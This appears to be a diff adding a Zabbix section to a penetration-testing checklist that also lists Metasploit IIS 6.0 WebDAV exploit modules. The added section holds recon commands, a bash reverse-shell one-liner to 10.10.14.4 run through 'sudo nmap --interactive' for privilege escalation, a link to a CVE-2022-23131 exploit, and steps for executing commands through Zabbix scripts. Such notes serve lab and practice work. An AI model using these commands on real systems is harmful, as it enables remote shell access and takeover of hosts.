@@ -32,3 +32,18 @@
 - [ ] IIS 6.0
     - [ ] `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
     - [ ] `exploit/windows/iis/iis_webdav_upload_asp`
+
+
+## Zabbix
+
+```bash
+id
+whoami
+uname -a
+echo "Using at to schedule reverse shell execution.."
+echo 'echo "!/bin/bash -i >& /dev/tcp/10.10.14.4/80 0>&1"|sudo nmap --interactive'
+```
+
+- [ ] [CVE-2022-23131](https://github.com/trganda/CVE-2022-23131)
+- [ ] Add new [script](https://medium.com/@0x616163/pivoting-with-devops-tools-abusing-zabbix-877e92bf49c2) shell command
+- [ ] Hosts > Host to execute > Select Script and execute 
